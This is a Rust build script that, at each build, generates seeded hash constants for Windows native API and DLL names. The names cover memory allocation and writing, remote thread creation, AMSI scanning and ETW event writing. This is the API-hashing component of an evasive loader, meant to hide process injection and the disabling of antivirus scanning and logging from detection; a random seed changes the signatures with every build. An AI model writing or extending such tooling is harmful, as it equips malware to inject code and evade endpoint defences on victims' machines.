use std::env;
use std::fs;
use std::path::Path;
use rand::Rng;

fn hash_str(s: &str, seed: u32) -> u32 {
    let mut hash: u32 = seed;
    for b in s.bytes() {
        let b = b.to_ascii_lowercase();
        hash = hash.rotate_right(13) ^ (b as u32);
    }
    hash
}

fn hash_wstr(s: &str, seed: u32) -> u32 {
    let mut hash: u32 = seed;
    for c in s.encode_utf16() {
        let b = (c as u8).to_ascii_lowercase();
        hash = hash.rotate_right(13) ^ (b as u32);
    }
    hash // very simplified
}

fn main() {
    let out_dir = env::var_os("OUT_DIR").unwrap();
    let dest_path = Path::new(&out_dir).join("api_hashes.rs");
    
    let mut rng = rand::thread_rng();
    let seed: u32 = rng.gen();
    
    let apis = [
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtCreateThreadEx",
        "NtClose",
        "NtOpenFile",
        "NtProtectVirtualMemory",
        "AmsiScanBuffer",
        "AmsiInitialize",
        "EtwEventWrite",
    ];
    let dlls = [
        "ntdll.dll",
        "amsi.dll",
        "kernel32.dll",
    ];

    let mut rs = format!("pub const SEED: u32 = {:#x};\n", seed);
    for api in apis {
        rs.push_str(&format!("pub const HASH_{}: u32 = {:#x};\n", api.to_uppercase(), hash_str(api, seed)));
    }
    for dll in dlls {
        let name = dll.replace(".", "_").to_uppercase();
        rs.push_str(&format!("pub const HASH_{}: u32 = {:#x};\n", name, hash_str(dll, seed)));
    }
    
    fs::write(&dest_path, rs).unwrap();
    println!("cargo:rerun-if-changed=build.rs");
}
